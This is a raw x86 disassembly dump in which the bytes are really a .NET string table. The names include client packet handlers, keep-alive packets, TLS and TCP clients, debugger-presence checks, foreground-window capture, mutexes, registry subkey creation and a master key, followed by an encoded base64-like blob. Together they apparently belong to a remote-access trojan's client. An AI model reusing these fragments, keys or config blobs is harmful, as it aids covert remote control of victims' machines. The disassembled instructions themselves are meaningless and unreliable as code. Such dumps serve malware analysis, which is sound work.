  40918f:	53                   	push   %ebx
  409190:	65 74 00             	gs je  0x409193
  409193:	54                   	push   %esp
  409194:	61                   	popa
  409195:	72 67                	jb     0x4091fe
  409197:	65 74 00             	gs je  0x40919a
  40919a:	43                   	inc    %ebx
  40919b:	6c                   	insb   (%dx),%es:(%edi)
  40919c:	69 65 6e 74 2e 48 61 	imul   $0x61482e74,0x6e(%ebp),%esp
  4091a3:	6e                   	outsb  %ds:(%esi),(%dx)
  4091a4:	64 6c                	fs insb (%dx),%es:(%edi)
  4091a6:	65 5f                	gs pop %edi
  4091a8:	50                   	push   %eax
  4091a9:	61                   	popa
  4091aa:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4091ad:	74 00                	je     0x4091af
  4091af:	4b                   	dec    %ebx
  4091b0:	65 65 70 41          	gs gs jo 0x4091f5
  4091b4:	6c                   	insb   (%dx),%es:(%edi)
  4091b5:	69 76 65 50 61 63 6b 	imul   $0x6b636150,0x65(%esi),%esi
  4091bc:	65 74 00             	gs je  0x4091bf
  4091bf:	43                   	inc    %ebx
  4091c0:	6c                   	insb   (%dx),%es:(%edi)
  4091c1:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  4091c8:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  4091cc:	53                   	push   %ebx
  4091cd:	79 73                	jns    0x409242
  4091cf:	74 65                	je     0x409236
  4091d1:	6d                   	insl   (%dx),%es:(%edi)
  4091d2:	2e 43                	cs inc %ebx
  4091d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4091d5:	6c                   	insb   (%dx),%es:(%edi)
  4091d6:	6c                   	insb   (%dx),%es:(%edi)
  4091d7:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4091dd:	73 2e                	jae    0x40920d
  4091df:	49                   	dec    %ecx
  4091e0:	45                   	inc    %ebp
  4091e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4091e2:	75 6d                	jne    0x409251
  4091e4:	65 72 61             	gs jb  0x409248
  4091e7:	74 6f                	je     0x409258
  4091e9:	72 2e                	jb     0x409219
  4091eb:	52                   	push   %edx
  4091ec:	65 73 65             	gs jae 0x409254
  4091ef:	74 00                	je     0x4091f1
  4091f1:	67 65 74 5f          	addr16 gs je 0x409254
  4091f5:	4f                   	dec    %edi
  4091f6:	66 66 73 65          	data16 data16 jae 0x40925f
  4091fa:	74 00                	je     0x4091fc
  4091fc:	73 65                	jae    0x409263
  4091fe:	74 5f                	je     0x40925f
  409200:	4f                   	dec    %edi
  409201:	66 66 73 65          	data16 data16 jae 0x40926a
  409205:	74 00                	je     0x409207
  409207:	53                   	push   %ebx
  409208:	70 6c                	jo     0x409276
  40920a:	69 74 00 43 6c 69 65 	imul   $0x6e65696c,0x43(%eax,%eax,1),%esi
  409211:	6e 
  409212:	74 4f                	je     0x409263
  409214:	6e                   	outsb  %ds:(%esi),(%dx)
  409215:	45                   	inc    %ebp
  409216:	78 69                	js     0x409281
  409218:	74 00                	je     0x40921a
  40921a:	53                   	push   %ebx
  40921b:	61                   	popa
  40921c:	6c                   	insb   (%dx),%es:(%edi)
  40921d:	74 00                	je     0x40921f
  40921f:	49                   	dec    %ecx
  409220:	41                   	inc    %ecx
  409221:	73 79                	jae    0x40929c
  409223:	6e                   	outsb  %ds:(%esi),(%dx)
  409224:	63 52 65             	arpl   %edx,0x65(%edx)
  409227:	73 75                	jae    0x40929e
  409229:	6c                   	insb   (%dx),%es:(%edi)
  40922a:	74 00                	je     0x40922c
  40922c:	54                   	push   %esp
  40922d:	6f                   	outsl  %ds:(%esi),(%dx)
  40922e:	55                   	push   %ebp
  40922f:	70 70                	jo     0x4092a1
  409231:	65 72 49             	gs jb  0x40927d
  409234:	6e                   	outsb  %ds:(%esi),(%dx)
  409235:	76 61                	jbe    0x409298
  409237:	72 69                	jb     0x4092a2
  409239:	61                   	popa
  40923a:	6e                   	outsb  %ds:(%esi),(%dx)
  40923b:	74 00                	je     0x40923d
  40923d:	57                   	push   %edi
  40923e:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409242:	69 65 6e 74 00 49 6e 	imul   $0x6e490074,0x6e(%ebp),%esp
  409249:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409250:	65 
  409251:	43                   	inc    %ebx
  409252:	6c                   	insb   (%dx),%es:(%edi)
  409253:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  40925a:	74 5f                	je     0x4092bb
  40925c:	53                   	push   %ebx
  40925d:	73 6c                	jae    0x4092cb
  40925f:	43                   	inc    %ebx
  409260:	6c                   	insb   (%dx),%es:(%edi)
  409261:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409268:	74 5f                	je     0x4092c9
  40926a:	53                   	push   %ebx
  40926b:	73 6c                	jae    0x4092d9
  40926d:	43                   	inc    %ebx
  40926e:	6c                   	insb   (%dx),%es:(%edi)
  40926f:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409276:	74 5f                	je     0x4092d7
  409278:	54                   	push   %esp
  409279:	63 70 43             	arpl   %esi,0x43(%eax)
  40927c:	6c                   	insb   (%dx),%es:(%edi)
  40927d:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409284:	74 5f                	je     0x4092e5
  409286:	54                   	push   %esp
  409287:	63 70 43             	arpl   %esi,0x43(%eax)
  40928a:	6c                   	insb   (%dx),%es:(%edi)
  40928b:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409292:	74 68                	je     0x4092fc
  409294:	65 6e                	outsb  %gs:(%esi),(%dx)
  409296:	74 69                	je     0x409301
  409298:	63 61 74             	arpl   %esp,0x74(%ecx)
  40929b:	65 41                	gs inc %ecx
  40929d:	73 43                	jae    0x4092e2
  40929f:	6c                   	insb   (%dx),%es:(%edi)
  4092a0:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  4092a7:	73 74                	jae    0x40931d
  4092a9:	65 6d                	gs insl (%dx),%es:(%edi)
  4092ab:	2e 4d                	cs dec %ebp
  4092ad:	61                   	popa
  4092ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4092af:	61                   	popa
  4092b0:	67 65 6d             	gs insl (%dx),%es:(%di)
  4092b3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092b5:	74 00                	je     0x4092b7
  4092b7:	45                   	inc    %ebp
  4092b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b9:	76 69                	jbe    0x409324
  4092bb:	72 6f                	jb     0x40932c
  4092bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4092be:	6d                   	insl   (%dx),%es:(%edi)
  4092bf:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092c1:	74 00                	je     0x4092c3
  4092c3:	70 61                	jo     0x409326
  4092c5:	72 65                	jb     0x40932c
  4092c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4092c8:	74 00                	je     0x4092ca
  4092ca:	53                   	push   %ebx
  4092cb:	79 73                	jns    0x409340
  4092cd:	74 65                	je     0x409334
  4092cf:	6d                   	insl   (%dx),%es:(%edi)
  4092d0:	2e 43                	cs inc %ebx
  4092d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4092d3:	6c                   	insb   (%dx),%es:(%edi)
  4092d4:	6c                   	insb   (%dx),%es:(%edi)
  4092d5:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092da:	6e                   	outsb  %ds:(%esi),(%dx)
  4092db:	73 2e                	jae    0x40930b
  4092dd:	49                   	dec    %ecx
  4092de:	45                   	inc    %ebp
  4092df:	6e                   	outsb  %ds:(%esi),(%dx)
  4092e0:	75 6d                	jne    0x40934f
  4092e2:	65 72 61             	gs jb  0x409346
  4092e5:	74 6f                	je     0x409356
  4092e7:	72 2e                	jb     0x409317
  4092e9:	43                   	inc    %ebx
  4092ea:	75 72                	jne    0x40935e
  4092ec:	72 65                	jb     0x409353
  4092ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ef:	74 00                	je     0x4092f1
  4092f1:	53                   	push   %ebx
  4092f2:	79 73                	jns    0x409367
  4092f4:	74 65                	je     0x40935b
  4092f6:	6d                   	insl   (%dx),%es:(%edi)
  4092f7:	2e 43                	cs inc %ebx
  4092f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4092fa:	6c                   	insb   (%dx),%es:(%edi)
  4092fb:	6c                   	insb   (%dx),%es:(%edi)
  4092fc:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409301:	6e                   	outsb  %ds:(%esi),(%dx)
  409302:	73 2e                	jae    0x409332
  409304:	49                   	dec    %ecx
  409305:	45                   	inc    %ebp
  409306:	6e                   	outsb  %ds:(%esi),(%dx)
  409307:	75 6d                	jne    0x409376
  409309:	65 72 61             	gs jb  0x40936d
  40930c:	74 6f                	je     0x40937d
  40930e:	72 2e                	jb     0x40933e
  409310:	67 65 74 5f          	addr16 gs je 0x409373
  409314:	43                   	inc    %ebx
  409315:	75 72                	jne    0x409389
  409317:	72 65                	jb     0x40937e
  409319:	6e                   	outsb  %ds:(%esi),(%dx)
  40931a:	74 00                	je     0x40931c
  40931c:	47                   	inc    %edi
  40931d:	65 74 43             	gs je  0x409363
  409320:	75 72                	jne    0x409394
  409322:	72 65                	jb     0x409389
  409324:	6e                   	outsb  %ds:(%esi),(%dx)
  409325:	74 00                	je     0x409327
  409327:	43                   	inc    %ebx
  409328:	68 65 63 6b 52       	push   $0x526b6365
  40932d:	65 6d                	gs insl (%dx),%es:(%edi)
  40932f:	6f                   	outsl  %ds:(%esi),(%dx)
  409330:	74 65                	je     0x409397
  409332:	44                   	inc    %esp
  409333:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409337:	67 65 72 50          	addr16 gs jb 0x40938b
  40933b:	72 65                	jb     0x4093a2
  40933d:	73 65                	jae    0x4093a4
  40933f:	6e                   	outsb  %ds:(%esi),(%dx)
  409340:	74 00                	je     0x409342
  409342:	69 73 44 65 62 75 67 	imul   $0x67756265,0x44(%ebx),%esi
  409349:	67 65 72 50          	addr16 gs jb 0x40939d
  40934d:	72 65                	jb     0x4093b4
  40934f:	73 65                	jae    0x4093b6
  409351:	6e                   	outsb  %ds:(%esi),(%dx)
  409352:	74 00                	je     0x409354
  409354:	67 65 74 5f          	addr16 gs je 0x4093b7
  409358:	52                   	push   %edx
  409359:	65 6d                	gs insl (%dx),%es:(%edi)
  40935b:	6f                   	outsl  %ds:(%esi),(%dx)
  40935c:	74 65                	je     0x4093c3
  40935e:	45                   	inc    %ebp
  40935f:	6e                   	outsb  %ds:(%esi),(%dx)
  409360:	64 50                	fs push %eax
  409362:	6f                   	outsl  %ds:(%esi),(%dx)
  409363:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  40936a:	5f                   	pop    %edi
  40936b:	43                   	inc    %ebx
  40936c:	6f                   	outsl  %ds:(%esi),(%dx)
  40936d:	75 6e                	jne    0x4093dd
  40936f:	74 00                	je     0x409371
  409371:	67 65 74 5f          	addr16 gs je 0x4093d4
  409375:	50                   	push   %eax
  409376:	72 6f                	jb     0x4093e7
  409378:	63 65 73             	arpl   %esp,0x73(%ebp)
  40937b:	73 6f                	jae    0x4093ec
  40937d:	72 43                	jb     0x4093c2
  40937f:	6f                   	outsl  %ds:(%esi),(%dx)
  409380:	75 6e                	jne    0x4093f0
  409382:	74 00                	je     0x409384
  409384:	63 6f 75             	arpl   %ebp,0x75(%edi)
  409387:	6e                   	outsb  %ds:(%esi),(%dx)
  409388:	74 00                	je     0x40938a
  40938a:	47                   	inc    %edi
  40938b:	65 74 50             	gs je  0x4093de
  40938e:	61                   	popa
  40938f:	74 68                	je     0x4093f9
  409391:	52                   	push   %edx
  409392:	6f                   	outsl  %ds:(%esi),(%dx)
  409393:	6f                   	outsl  %ds:(%esi),(%dx)
  409394:	74 00                	je     0x409396
  409396:	44                   	inc    %esp
  409397:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40939b:	70 74                	jo     0x409411
  40939d:	00 45 6e             	add    %al,0x6e(%ebp)
  4093a0:	63 72 79             	arpl   %esi,0x79(%edx)
  4093a3:	70 74                	jo     0x409419
  4093a5:	00 50 61             	add    %dl,0x61(%eax)
  4093a8:	72 61                	jb     0x40940b
  4093aa:	6d                   	insl   (%dx),%es:(%edi)
  4093ab:	65 74 65             	gs je  0x409413
  4093ae:	72 69                	jb     0x409419
  4093b0:	7a 65                	jp     0x409417
  4093b2:	64 54                	fs push %esp
  4093b4:	68 72 65 61 64       	push   $0x64616572
  4093b9:	53                   	push   %ebx
  4093ba:	74 61                	je     0x40941d
  4093bc:	72 74                	jb     0x409432
  4093be:	00 43 6f             	add    %al,0x6f(%ebx)
  4093c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4093c2:	76 65                	jbe    0x409429
  4093c4:	72 74                	jb     0x40943a
  4093c6:	00 46 61             	add    %al,0x61(%esi)
  4093c9:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  4093d0:	54 
  4093d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4093d2:	4c                   	dec    %esp
  4093d3:	69 73 74 00 69 6e 70 	imul   $0x706e6900,0x74(%ebx),%esi
  4093da:	75 74                	jne    0x409450
  4093dc:	00 53 79             	add    %dl,0x79(%ebx)
  4093df:	73 74                	jae    0x409455
  4093e1:	65 6d                	gs insl (%dx),%es:(%edi)
  4093e3:	2e 43                	cs inc %ebx
  4093e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4093e6:	6c                   	insb   (%dx),%es:(%edi)
  4093e7:	6c                   	insb   (%dx),%es:(%edi)
  4093e8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4093ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4093ee:	73 2e                	jae    0x40941e
  4093f0:	49                   	dec    %ecx
  4093f1:	45                   	inc    %ebp
  4093f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4093f3:	75 6d                	jne    0x409462
  4093f5:	65 72 61             	gs jb  0x409459
  4093f8:	74 6f                	je     0x409469
  4093fa:	72 2e                	jb     0x40942a
  4093fc:	4d                   	dec    %ebp
  4093fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4093fe:	76 65                	jbe    0x409465
  409400:	4e                   	dec    %esi
  409401:	65 78 74             	gs js  0x409478
  409404:	00 53 79             	add    %dl,0x79(%ebx)
  409407:	73 74                	jae    0x40947d
  409409:	65 6d                	gs insl (%dx),%es:(%edi)
  40940b:	2e 54                	cs push %esp
  40940d:	65 78 74             	gs js  0x409484
  409410:	00 47 65             	add    %al,0x65(%edi)
  409413:	74 57                	je     0x40946c
  409415:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  40941c:	78 74                	js     0x409492
  40941e:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  409422:	74 00                	je     0x409424
  409424:	76 00                	jbe    0x409426
  409426:	47                   	inc    %edi
  409427:	65 74 46             	gs je  0x409470
  40942a:	6f                   	outsl  %ds:(%esi),(%dx)
  40942b:	72 65                	jb     0x409492
  40942d:	67 72 6f             	addr16 jb 0x40949f
  409430:	75 6e                	jne    0x4094a0
  409432:	64 57                	fs push %edi
  409434:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  40943b:	65 74 5f             	gs je  0x40949d
  40943e:	43                   	inc    %ebx
  40943f:	72 65                	jb     0x4094a6
  409441:	61                   	popa
  409442:	74 65                	je     0x4094a9
  409444:	4e                   	dec    %esi
  409445:	6f                   	outsl  %ds:(%esi),(%dx)
  409446:	57                   	push   %edi
  409447:	69 6e 64 6f 77 00 69 	imul   $0x6900776f,0x64(%esi),%ebp
  40944e:	6e                   	outsb  %ds:(%esi),(%dx)
  40944f:	64 65 78 00          	fs gs js 0x409453
  409453:	43                   	inc    %ebx
  409454:	6c                   	insb   (%dx),%es:(%edi)
  409455:	6f                   	outsl  %ds:(%esi),(%dx)
  409456:	73 65                	jae    0x4094bd
  409458:	4d                   	dec    %ebp
  409459:	75 74                	jne    0x4094cf
  40945b:	65 78 00             	gs js  0x40945e
  40945e:	43                   	inc    %ebx
  40945f:	72 65                	jb     0x4094c6
  409461:	61                   	popa
  409462:	74 65                	je     0x4094c9
  409464:	4d                   	dec    %ebp
  409465:	75 74                	jne    0x4094db
  409467:	65 78 00             	gs js  0x40946a
  40946a:	44                   	inc    %esp
  40946b:	65 6c                	gs insb (%dx),%es:(%edi)
  40946d:	61                   	popa
  40946e:	79 00                	jns    0x409470
  409470:	57                   	push   %edi
  409471:	69 72 74 65 41 72 72 	imul   $0x72724165,0x74(%edx),%esi
  409478:	61                   	popa
  409479:	79 00                	jns    0x40947b
  40947b:	49                   	dec    %ecx
  40947c:	6e                   	outsb  %ds:(%esi),(%dx)
  40947d:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409484:	65 
  409485:	41                   	inc    %ecx
  409486:	72 72                	jb     0x4094fa
  409488:	61                   	popa
  409489:	79 00                	jns    0x40948b
  40948b:	4d                   	dec    %ebp
  40948c:	73 67                	jae    0x4094f5
  40948e:	50                   	push   %eax
  40948f:	61                   	popa
  409490:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  409493:	72 72                	jb     0x409507
  409495:	61                   	popa
  409496:	79 00                	jns    0x409498
  409498:	54                   	push   %esp
  409499:	6f                   	outsl  %ds:(%esi),(%dx)
  40949a:	41                   	inc    %ecx
  40949b:	72 72                	jb     0x40950f
  40949d:	61                   	popa
  40949e:	79 00                	jns    0x4094a0
  4094a0:	67 65 74 5f          	addr16 gs je 0x409503
  4094a4:	41                   	inc    %ecx
  4094a5:	73 41                	jae    0x4094e8
  4094a7:	72 72                	jb     0x40951b
  4094a9:	61                   	popa
  4094aa:	79 00                	jns    0x4094ac
  4094ac:	72 65                	jb     0x409513
  4094ae:	66 41                	inc    %cx
  4094b0:	73 41                	jae    0x4094f3
  4094b2:	72 72                	jb     0x409526
  4094b4:	61                   	popa
  4094b5:	79 00                	jns    0x4094b7
  4094b7:	67 65 74 5f          	addr16 gs je 0x40951a
  4094bb:	4b                   	dec    %ebx
  4094bc:	65 79 00             	gs jns 0x4094bf
  4094bf:	73 65                	jae    0x409526
  4094c1:	74 5f                	je     0x409522
  4094c3:	4b                   	dec    %ebx
  4094c4:	65 79 00             	gs jns 0x4094c7
  4094c7:	43                   	inc    %ebx
  4094c8:	72 65                	jb     0x40952f
  4094ca:	61                   	popa
  4094cb:	74 65                	je     0x409532
  4094cd:	53                   	push   %ebx
  4094ce:	75 62                	jne    0x409532
  4094d0:	4b                   	dec    %ebx
  4094d1:	65 79 00             	gs jns 0x4094d4
  4094d4:	44                   	inc    %esp
  4094d5:	65 6c                	gs insb (%dx),%es:(%edi)
  4094d7:	65 74 65             	gs je  0x40953f
  4094da:	53                   	push   %ebx
  4094db:	75 62                	jne    0x40953f
  4094dd:	4b                   	dec    %ebx
  4094de:	65 79 00             	gs jns 0x4094e1
  4094e1:	4f                   	dec    %edi
  4094e2:	70 65                	jo     0x409549
  4094e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4094e5:	53                   	push   %ebx
  4094e6:	75 62                	jne    0x40954a
  4094e8:	4b                   	dec    %ebx
  4094e9:	65 79 00             	gs jns 0x4094ec
  4094ec:	67 65 74 5f          	addr16 gs je 0x40954f
  4094f0:	50                   	push   %eax
  4094f1:	75 62                	jne    0x409555
  4094f3:	6c                   	insb   (%dx),%es:(%edi)
  4094f4:	69 63 4b 65 79 00 5f 	imul   $0x5f007965,0x4b(%ebx),%esp
  4094fb:	61                   	popa
  4094fc:	75 74                	jne    0x409572
  4094fe:	68 4b 65 79 00       	push   $0x79654b
  409503:	6d                   	insl   (%dx),%es:(%edi)
  409504:	61                   	popa
  409505:	73 74                	jae    0x40957b
  409507:	65 72 4b             	gs jb  0x409555
  40950a:	65 79 00             	gs jns 0x40950d
  40950d:	52                   	push   %edx
  40950e:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409515:	4b 65 
  409517:	79 00                	jns    0x409519
  409519:	5f                   	pop    %edi
  40951a:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  40951e:	53                   	push   %ebx
  40951f:	79 73                	jns    0x409594
  409521:	74 65                	je     0x409588
  409523:	6d                   	insl   (%dx),%es:(%edi)
  409524:	2e 53                	cs push %ebx
  409526:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40952a:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409531:	70 
  409532:	74 6f                	je     0x4095a3
  409534:	67 72 61             	addr16 jb 0x409598
  409537:	70 68                	jo     0x4095a1
  409539:	79 00                	jns    0x40953b
  40953b:	41                   	inc    %ecx
  40953c:	73 73                	jae    0x4095b1
  40953e:	65 6d                	gs insl (%dx),%es:(%edi)
  409540:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409544:	41                   	inc    %ecx
  409545:	64 64 72 65          	fs fs jb 0x4095ae
  409549:	73 73                	jae    0x4095be
  40954b:	46                   	inc    %esi
  40954c:	61                   	popa
  40954d:	6d                   	insl   (%dx),%es:(%edi)
  40954e:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409555:	63 
  409556:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  40955a:	79 00                	jns    0x40955c
  40955c:	57                   	push   %edi
  40955d:	72 69                	jb     0x4095c8
  40955f:	74 65                	je     0x4095c6
  409561:	42                   	inc    %edx
  409562:	69 6e 61 72 79 00 54 	imul   $0x54007972,0x61(%esi),%ebp
  409569:	6f                   	outsl  %ds:(%esi),(%dx)
  40956a:	42                   	inc    %edx
  40956b:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409572:	65 74 5f             	gs je  0x4095d4
  409575:	53                   	push   %ebx
  409576:	79 73                	jns    0x4095eb
  409578:	74 65                	je     0x4095df
  40957a:	6d                   	insl   (%dx),%es:(%edi)
  40957b:	44                   	inc    %esp
  40957c:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409583:	79 00                	jns    0x409585
  409585:	53                   	push   %ebx
  409586:	65 74 52             	gs je  0x4095db
  409589:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  409590:	00 6f 
  409592:	70 5f                	jo     0x4095f3
  409594:	45                   	inc    %ebp
  409595:	71 75                	jno    0x40960c
  409597:	61                   	popa
  409598:	6c                   	insb   (%dx),%es:(%edi)
  409599:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  4095a0:	49 
  4095a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4095a2:	65 71 75             	gs jno 0x40961a
  4095a5:	61                   	popa
  4095a6:	6c                   	insb   (%dx),%es:(%edi)
  4095a7:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  4095ae:	74 
  4095af:	65 6d                	gs insl (%dx),%es:(%edi)
  4095b1:	2e 4e                	cs dec %esi
  4095b3:	65 74 2e             	gs je  0x4095e4
  4095b6:	53                   	push   %ebx
  4095b7:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4095bb:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  4095c2:	64 
  4095c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4095c4:	77 73                	ja     0x409639
  4095c6:	49                   	dec    %ecx
  4095c7:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4095ca:	74 69                	je     0x409635
  4095cc:	74 79                	je     0x409647
  4095ce:	00 49 73             	add    %cl,0x73(%ecx)
  4095d1:	4e                   	dec    %esi
  4095d2:	75 6c                	jne    0x409640
  4095d4:	6c                   	insb   (%dx),%es:(%edi)
  4095d5:	4f                   	dec    %edi
  4095d6:	72 45                	jb     0x40961d
  4095d8:	6d                   	insl   (%dx),%es:(%edi)
  4095d9:	70 74                	jo     0x40964f
  4095db:	79 00                	jns    0x4095dd
  4095dd:	00 00                	add    %al,(%eax)
  4095df:	00 00                	add    %al,(%eax)
  4095e1:	0d 53 00 48 00       	or     $0x480053,%eax
  4095e6:	41                   	inc    %ecx
  4095e7:	00 32                	add    %dh,(%edx)
  4095e9:	00 35 00 36 00 00    	add    %dh,0x3600
  4095ef:	80 d9 67             	sbb    $0x67,%cl
  4095f2:	00 7a 00             	add    %bh,0x0(%edx)
  4095f5:	79 00                	jns    0x4095f7
  4095f7:	62 00                	bound  %eax,(%eax)
  4095f9:	71 00                	jno    0x4095fb
  4095fb:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
  4095ff:	76 00                	jbe    0x409601
  409601:	39 00                	cmp    %eax,(%eax)
  409603:	48                   	dec    %eax
  409604:	00 34 00             	add    %dh,(%eax,%eax,1)
  409607:	62 00                	bound  %eax,(%eax)
  409609:	61                   	popa
  40960a:	00 61 00             	add    %ah,0x0(%ecx)
  40960d:	4d                   	dec    %ebp
  40960e:	00 42 00             	add    %al,0x0(%edx)
  409611:	6b 00 69             	imul   $0x69,(%eax),%eax
  409614:	00 43 00             	add    %al,0x0(%ebx)
  409617:	6f                   	outsl  %ds:(%esi),(%dx)
  409618:	00 53 00             	add    %dl,0x0(%ebx)
  40961b:	49                   	dec    %ecx
  40961c:	00 6f 00             	add    %ch,0x0(%edi)
  40961f:	4f                   	dec    %edi
  409620:	00 65 00             	add    %ah,0x0(%ebp)
  409623:	6b 00 4c             	imul   $0x4c,(%eax),%eax
  409626:	00 42 00             	add    %al,0x0(%edx)
  409629:	44                   	inc    %esp
  40962a:	00 51 00             	add    %dl,0x0(%ecx)
  40962d:	54                   	push   %esp
  40962e:	00 55 00             	add    %dl,0x0(%ebp)
  409631:	61                   	popa
  409632:	00 53 00             	add    %dl,0x0(%ebx)
  409635:	66 00 32             	data16 add %dh,(%edx)
  409638:	00 58 00             	add    %bl,0x0(%eax)
  40963b:	63 00                	arpl   %eax,(%eax)
  40963d:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  409641:	6a 00                	push   $0x0
  409643:	68 00 4f 00 30       	push   $0x30004f00
  409648:	00 62 00             	add    %ah,0x0(%edx)
  40964b:	68 00 47 00 48       	push   $0x48004700
  409650:	00 30                	add    %dh,(%eax)
  409652:	00 6f 00             	add    %ch,0x0(%edi)
  409655:	39 00                	cmp    %eax,(%eax)
  409657:	32 00                	xor    (%eax),%al
  409659:	4e                   	dec    %esi
  40965a:	00 53 00             	add    %dl,0x0(%ebx)
  40965d:	4f                   	dec    %edi
  40965e:	00 70 00             	add    %dh,0x0(%eax)
  409661:	48                   	dec    %eax
  409662:	00 67 00             	add    %ah,0x0(%edi)
  409665:	62 00                	bound  %eax,(%eax)
  409667:	41                   	inc    %ecx
  409668:	00 57 00             	add    %dl,0x0(%edi)
  40966b:	34 00                	xor    $0x0,%al
  40966d:	6a 00                	push   $0x0
  40966f:	46                   	inc    %esi
  409670:	00 32                	add    %dh,(%edx)
  409672:	00 57 00             	add    %dl,0x0(%edi)
  409675:	79 00                	jns    0x409677
  409677:	6a 00                	push   $0x0
  409679:	4a                   	dec    %edx
  40967a:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
  40967e:	00 30                	add    %dh,(%eax)
  409680:	00 41 00             	add    %al,0x0(%ecx)
  409683:	51                   	push   %ecx
  409684:	00 48 00             	add    %cl,0x0(%eax)
  409687:	6c                   	insb   (%dx),%es:(%edi)
  409688:	00 4d 00             	add    %cl,0x0(%ebp)
  40968b:	7a 00                	jp     0x40968d
  40968d:	32 00                	xor    (%eax),%al
  40968f:	77 00                	ja     0x409691
  409691:	77 00                	ja     0x409693
  409693:	52                   	push   %edx
  409694:	00 4e 00             	add    %cl,0x0(%esi)
  409697:	41                   	inc    %ecx
  409698:	00 35 00 42 00 57    	add    %dh,0x57004200
  40969e:	00 50 00             	add    %dl,0x0(%eax)
  4096a1:	63 00                	arpl   %eax,(%eax)
  4096a3:	55                   	push   %ebp
  4096a4:	00 31                	add    %dh,(%ecx)
  4096a6:	00 4e 00             	add    %cl,0x0(%esi)
  4096a9:	4c                   	dec    %esp
  4096aa:	00 6b 00             	add    %ch,0x0(%ebx)
  4096ad:	6b 00 73             	imul   $0x73,(%eax),%eax
  4096b0:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  4096b4:	00 71 00             	add    %dh,0x0(%ecx)
  4096b7:	54                   	push   %esp
  4096b8:	00 79 00             	add    %bh,0x0(%ecx)
  4096bb:	50                   	push   %eax
  4096bc:	00 44 00 57          	add    %al,0x57(%eax,%eax,1)
  4096c0:	00 52 00             	add    %dl,0x0(%edx)
  4096c3:	51                   	push   %ecx
  4096c4:	00 34 00             	add    %dh,(%eax,%eax,1)
  4096c7:	3d 00 00 81 31       	cmp    $0x31810000,%eax
  4096cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4096cd:	00 78 00             	add    %bh,0x0(%eax)
  4096d0:	72 00                	jb     0x4096d2
  4096d2:	31 00                	xor    %eax,(%eax)
  4096d4:	55                   	push   %ebp
  4096d5:	00 4f 00             	add    %cl,0x0(%edi)
  4096d8:	49                   	dec    %ecx
